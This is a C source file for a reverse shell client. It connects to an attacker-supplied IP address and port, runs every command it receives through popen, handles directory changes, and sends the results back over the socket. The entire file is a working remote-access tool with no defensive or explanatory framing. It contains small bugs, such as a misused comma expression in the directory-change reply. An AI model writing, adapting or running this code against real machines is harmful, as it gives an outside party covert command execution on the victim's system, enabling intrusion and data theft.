#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>

#define BUFFER_SIZE 8192
#define GREEN "\e[1;32m"
#define CYAN "\e[1;36m"
#define RED "\e[1;31m"
#define RESET "\033[0m"

int status, received, client_fd;
struct sockaddr_in serv_addr;
char buffer[BUFFER_SIZE] = { 0 };

//Catch Ctrl+C
static volatile int keepRunning = 1;

void intHandler(int dummy) {
    keepRunning = 0;
}

char *error;
void sizeErr(int bruh) {
    error = (RED "ERROR: Output is too small...\n" RESET);
    send(client_fd, error, strlen(error), 0);
}

void cdError(int bruhh) {
    error = (RED "ERROR: Something went wrong! Unable to change directory...\n" RESET);
    send(client_fd, error, strlen(error), 0);
}

void cmdErr(int bruhhh) {
    error = (RED "ERROR: Potentially invalid command!\n" RESET);
    send(client_fd, error, strlen(error), 0);
}

char *execute(const char *command) {
    FILE *pipe = popen(command, "r");
    if (!pipe) return NULL;
    char buf[BUFFER_SIZE];

    char *result = NULL;
    size_t size = 0;
    
    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        size_t len = strlen(buf);
        char *temp = realloc(result, size + len + 1);
        if (!temp) {
            free(result);
            pclose(pipe);
            return NULL;
        }
        result = temp;
        strcpy(result + size, buf);
        size += len;
    }

    pclose(pipe);
    return result;
}


int main(int argc, char *argv[]) {
    char *ip_addr = argv[1];
    unsigned short PORT = (unsigned short)atoi(argv[2]);

    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary
    if (inet_pton(AF_INET, ip_addr, &serv_addr.sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    if ((status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }

    while(keepRunning) {

        memset(buffer, 0, BUFFER_SIZE);
        received = read(client_fd, buffer, BUFFER_SIZE - 1);

        //Handles the cd command because without it, the server exits cuz popen.
        if (strncmp(buffer, "cd ", 3) == 0) {
            char *path = buffer + 3;
            buffer[received] = '\0';
            path[strcspn(path, "\r\n")] = 0;
            if (chdir(path) != 0) {
                cdError(0);
            } else {
                char *success = ("Directory changed to %s", path);
                send(client_fd, success, strlen(success), 0);
            }
            continue;
        }
        
        char *output = execute(buffer);

        if (received <= 0) {
            printf("Server died or something went wrong...");
            break;
        }

        if (output != NULL) {
            if (send(client_fd, output, strlen(output), 0) < 0) {
                printf("Unable to send output...");
                sizeErr(0);
            }
        } else {
            cmdErr(0);
        }
    }

    // closing the connected socket
    close(client_fd);
    return 0;
}
